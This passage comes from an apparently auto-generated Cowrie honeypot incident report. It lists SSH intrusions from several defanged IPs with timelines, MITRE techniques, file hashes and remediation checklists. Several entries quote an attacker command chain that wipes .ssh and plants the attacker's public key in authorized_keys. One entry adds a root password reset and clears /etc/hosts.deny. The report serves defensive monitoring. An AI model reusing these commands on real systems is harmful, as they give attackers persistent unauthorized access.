| `2026-06-09 20:17:22` | `cowrie.session.params` |
| `2026-06-09 20:17:22` | `cowrie.command.input` |
| `2026-06-09 20:17:22` | `cowrie.log.closed` |
| `2026-06-09 20:17:22` | `cowrie.session.params` |
| `2026-06-09 20:17:22` | `cowrie.command.input` |
| `2026-06-09 20:17:22` | `cowrie.log.closed` |
| `2026-06-09 20:17:23` | `cowrie.session.params` |
| `2026-06-09 20:17:23` | `cowrie.command.input` |
| `2026-06-09 20:17:23` | `cowrie.log.closed` |
| `2026-06-09 20:17:23` | `cowrie.session.params` |
| `2026-06-09 20:17:23` | `cowrie.command.input` |
| `2026-06-09 20:17:23` | `cowrie.log.closed` |
| `2026-06-09 20:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.191[.]90` to AbuseIPDB if not already reported
- [ ] Block `121.229.191[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c79688b723

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-06-09 20:17 |
| **Last Seen** | 2026-06-09 20:17 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ArIj9pcfYbZP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:17:06` | `cowrie.session.connect` |
| `2026-06-09 20:17:06` | `cowrie.client.version` |
| `2026-06-09 20:17:06` | `cowrie.client.kex` |
| `2026-06-09 20:17:07` | `cowrie.login.success` |
| `2026-06-09 20:17:07` | `cowrie.session.params` |
| `2026-06-09 20:17:07` | `cowrie.command.input` |
| `2026-06-09 20:17:07` | `cowrie.command.failed` |
| `2026-06-09 20:17:07` | `cowrie.log.closed` |
| `2026-06-09 20:17:08` | `cowrie.session.params` |
| `2026-06-09 20:17:08` | `cowrie.command.input` |
| `2026-06-09 20:17:08` | `cowrie.session.file_download` |
| `2026-06-09 20:17:08` | `cowrie.log.closed` |
| `2026-06-09 20:17:20` | `cowrie.session.params` |
| `2026-06-09 20:17:20` | `cowrie.command.input` |
| `2026-06-09 20:17:20` | `cowrie.log.closed` |
| `2026-06-09 20:17:21` | `cowrie.session.params` |
| `2026-06-09 20:17:21` | `cowrie.command.input` |
| `2026-06-09 20:17:21` | `cowrie.log.closed` |
| `2026-06-09 20:17:21` | `cowrie.session.params` |
| `2026-06-09 20:17:21` | `cowrie.command.input` |
| `2026-06-09 20:17:22` | `cowrie.session.file_download` |
| `2026-06-09 20:17:22` | `cowrie.log.closed` |
| `2026-06-09 20:17:22` | `cowrie.session.params` |
| `2026-06-09 20:17:22` | `cowrie.command.input` |
| `2026-06-09 20:17:22` | `cowrie.log.closed` |
| `2026-06-09 20:17:22` | `cowrie.session.params` |
| `2026-06-09 20:17:22` | `cowrie.command.input` |
| `2026-06-09 20:17:23` | `cowrie.log.closed` |
| `2026-06-09 20:17:23` | `cowrie.session.params` |
| `2026-06-09 20:17:23` | `cowrie.command.input` |
| `2026-06-09 20:17:23` | `cowrie.command.input` |
| `2026-06-09 20:17:23` | `cowrie.log.closed` |
| `2026-06-09 20:17:24` | `cowrie.session.params` |
| `2026-06-09 20:17:24` | `cowrie.command.input` |
| `2026-06-09 20:17:24` | `cowrie.log.closed` |
| `2026-06-09 20:17:24` | `cowrie.session.params` |
| `2026-06-09 20:17:24` | `cowrie.command.input` |
| `2026-06-09 20:17:24` | `cowrie.log.closed` |
| `2026-06-09 20:17:25` | `cowrie.session.params` |
| `2026-06-09 20:17:25` | `cowrie.command.input` |
| `2026-06-09 20:17:25` | `cowrie.log.closed` |
| `2026-06-09 20:17:25` | `cowrie.session.params` |
| `2026-06-09 20:17:25` | `cowrie.command.input` |
| `2026-06-09 20:17:25` | `cowrie.log.closed` |
| `2026-06-09 20:17:26` | `cowrie.session.params` |
| `2026-06-09 20:17:26` | `cowrie.command.input` |
| `2026-06-09 20:17:26` | `cowrie.log.closed` |
| `2026-06-09 20:17:26` | `cowrie.session.params` |
| `2026-06-09 20:17:26` | `cowrie.command.input` |
| `2026-06-09 20:17:26` | `cowrie.log.closed` |
| `2026-06-09 20:17:27` | `cowrie.session.params` |
| `2026-06-09 20:17:27` | `cowrie.command.input` |
| `2026-06-09 20:17:27` | `cowrie.log.closed` |
| `2026-06-09 20:17:27` | `cowrie.session.params` |
| `2026-06-09 20:17:27` | `cowrie.command.input` |
| `2026-06-09 20:17:27` | `cowrie.log.closed` |
| `2026-06-09 20:17:28` | `cowrie.session.params` |
| `2026-06-09 20:17:28` | `cowrie.command.input` |
| `2026-06-09 20:17:28` | `cowrie.log.closed` |
| `2026-06-09 20:17:28` | `cowrie.session.params` |
| `2026-06-09 20:17:28` | `cowrie.command.input` |
| `2026-06-09 20:17:28` | `cowrie.log.closed` |
| `2026-06-09 20:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a95d1c89c213

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-06-09 20:17 |
| **Last Seen** | 2026-06-09 20:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:17:48` | `cowrie.session.connect` |
| `2026-06-09 20:17:49` | `cowrie.client.version` |
| `2026-06-09 20:17:49` | `cowrie.client.kex` |
| `2026-06-09 20:17:49` | `cowrie.login.success` |
| `2026-06-09 20:17:50` | `cowrie.session.params` |
| `2026-06-09 20:17:50` | `cowrie.command.input` |
| `2026-06-09 20:17:50` | `cowrie.command.failed` |
| `2026-06-09 20:17:50` | `cowrie.log.closed` |
| `2026-06-09 20:17:51` | `cowrie.session.params` |
| `2026-06-09 20:17:51` | `cowrie.command.input` |
| `2026-06-09 20:17:51` | `cowrie.session.file_download` |
| `2026-06-09 20:17:51` | `cowrie.log.closed` |
| `2026-06-09 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aefea20cd0cb

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-06-09 20:17 |
| **Last Seen** | 2026-06-09 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:17:54` | `cowrie.session.connect` |
| `2026-06-09 20:17:54` | `cowrie.client.version` |
| `2026-06-09 20:17:54` | `cowrie.client.kex` |
| `2026-06-09 20:17:55` | `cowrie.login.success` |
| `2026-06-09 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd3096d80c7

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:27 |
| **Last Seen** | 2026-06-09 20:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:27:25` | `cowrie.session.connect` |
| `2026-06-09 20:27:25` | `cowrie.client.version` |
| `2026-06-09 20:27:25` | `cowrie.client.kex` |
| `2026-06-09 20:27:25` | `cowrie.login.success` |
| `2026-06-09 20:27:26` | `cowrie.session.params` |
| `2026-06-09 20:27:26` | `cowrie.command.input` |
| `2026-06-09 20:27:26` | `cowrie.command.failed` |
| `2026-06-09 20:27:26` | `cowrie.log.closed` |
| `2026-06-09 20:27:26` | `cowrie.session.params` |
| `2026-06-09 20:27:26` | `cowrie.command.input` |
| `2026-06-09 20:27:26` | `cowrie.session.file_download` |
| `2026-06-09 20:27:26` | `cowrie.log.closed` |
| `2026-06-09 20:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e80812beac

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:27 |
| **Last Seen** | 2026-06-09 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:27:28` | `cowrie.session.connect` |
| `2026-06-09 20:27:28` | `cowrie.client.version` |
| `2026-06-09 20:27:28` | `cowrie.client.kex` |
| `2026-06-09 20:27:29` | `cowrie.login.success` |
| `2026-06-09 20:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd11f0c8994d

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:33 |
| **Last Seen** | 2026-06-09 20:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:33:51` | `cowrie.session.connect` |
| `2026-06-09 20:33:51` | `cowrie.client.version` |
| `2026-06-09 20:33:51` | `cowrie.client.kex` |
| `2026-06-09 20:33:51` | `cowrie.login.success` |
| `2026-06-09 20:33:52` | `cowrie.session.params` |
| `2026-06-09 20:33:52` | `cowrie.command.input` |
| `2026-06-09 20:33:52` | `cowrie.command.failed` |
| `2026-06-09 20:33:52` | `cowrie.log.closed` |
| `2026-06-09 20:33:52` | `cowrie.session.params` |
| `2026-06-09 20:33:52` | `cowrie.command.input` |
| `2026-06-09 20:33:52` | `cowrie.session.file_download` |
| `2026-06-09 20:33:52` | `cowrie.log.closed` |
| `2026-06-09 20:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dde776c62de

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:33 |
| **Last Seen** | 2026-06-09 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:33:54` | `cowrie.session.connect` |
| `2026-06-09 20:33:54` | `cowrie.client.version` |
| `2026-06-09 20:33:55` | `cowrie.client.kex` |
| `2026-06-09 20:33:55` | `cowrie.login.success` |
| `2026-06-09 20:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e167839a7f51

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:35 |
| **Last Seen** | 2026-06-09 20:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:35:50` | `cowrie.session.connect` |
| `2026-06-09 20:35:50` | `cowrie.client.version` |
| `2026-06-09 20:35:51` | `cowrie.client.kex` |
| `2026-06-09 20:35:51` | `cowrie.login.success` |
| `2026-06-09 20:35:51` | `cowrie.session.params` |
| `2026-06-09 20:35:51` | `cowrie.command.input` |
| `2026-06-09 20:35:51` | `cowrie.command.failed` |
| `2026-06-09 20:35:52` | `cowrie.log.closed` |
| `2026-06-09 20:35:52` | `cowrie.session.params` |
| `2026-06-09 20:35:52` | `cowrie.command.input` |
| `2026-06-09 20:35:52` | `cowrie.session.file_download` |
| `2026-06-09 20:35:52` | `cowrie.log.closed` |
| `2026-06-09 20:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74babb9d588c

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:35 |
| **Last Seen** | 2026-06-09 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:35:54` | `cowrie.session.connect` |
| `2026-06-09 20:35:54` | `cowrie.client.version` |
| `2026-06-09 20:35:54` | `cowrie.client.kex` |
| `2026-06-09 20:35:55` | `cowrie.login.success` |
| `2026-06-09 20:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb88c3b65dc

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:37 |
| **Last Seen** | 2026-06-09 20:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:37:53` | `cowrie.session.connect` |
| `2026-06-09 20:37:53` | `cowrie.client.version` |
| `2026-06-09 20:37:53` | `cowrie.client.kex` |
| `2026-06-09 20:37:54` | `cowrie.login.success` |
| `2026-06-09 20:37:54` | `cowrie.session.params` |
| `2026-06-09 20:37:54` | `cowrie.command.input` |
| `2026-06-09 20:37:54` | `cowrie.command.failed` |
| `2026-06-09 20:37:54` | `cowrie.log.closed` |
| `2026-06-09 20:37:54` | `cowrie.session.params` |
| `2026-06-09 20:37:54` | `cowrie.command.input` |
| `2026-06-09 20:37:54` | `cowrie.session.file_download` |
| `2026-06-09 20:37:54` | `cowrie.log.closed` |
| `2026-06-09 20:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce283a4ff9ee

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:37 |
| **Last Seen** | 2026-06-09 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:37:56` | `cowrie.session.connect` |
| `2026-06-09 20:37:56` | `cowrie.client.version` |
| `2026-06-09 20:37:57` | `cowrie.client.kex` |
| `2026-06-09 20:37:57` | `cowrie.login.success` |
| `2026-06-09 20:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf3234b531c

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:46 |
| **Last Seen** | 2026-06-09 20:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:46:24` | `cowrie.session.connect` |
| `2026-06-09 20:46:24` | `cowrie.client.version` |
| `2026-06-09 20:46:24` | `cowrie.client.kex` |
| `2026-06-09 20:46:25` | `cowrie.login.success` |
| `2026-06-09 20:46:25` | `cowrie.session.params` |
| `2026-06-09 20:46:25` | `cowrie.command.input` |
| `2026-06-09 20:46:25` | `cowrie.command.failed` |
| `2026-06-09 20:46:26` | `cowrie.log.closed` |
| `2026-06-09 20:46:26` | `cowrie.session.params` |
| `2026-06-09 20:46:26` | `cowrie.command.input` |
| `2026-06-09 20:46:26` | `cowrie.session.file_download` |
| `2026-06-09 20:46:26` | `cowrie.log.closed` |
| `2026-06-09 20:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50f994b6e12

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:46 |
| **Last Seen** | 2026-06-09 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:46:28` | `cowrie.session.connect` |
| `2026-06-09 20:46:28` | `cowrie.client.version` |
| `2026-06-09 20:46:28` | `cowrie.client.kex` |
| `2026-06-09 20:46:29` | `cowrie.login.success` |
| `2026-06-09 20:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bbdefe0c36

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:50 |
| **Last Seen** | 2026-06-09 20:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:50:32` | `cowrie.session.connect` |
| `2026-06-09 20:50:32` | `cowrie.client.version` |
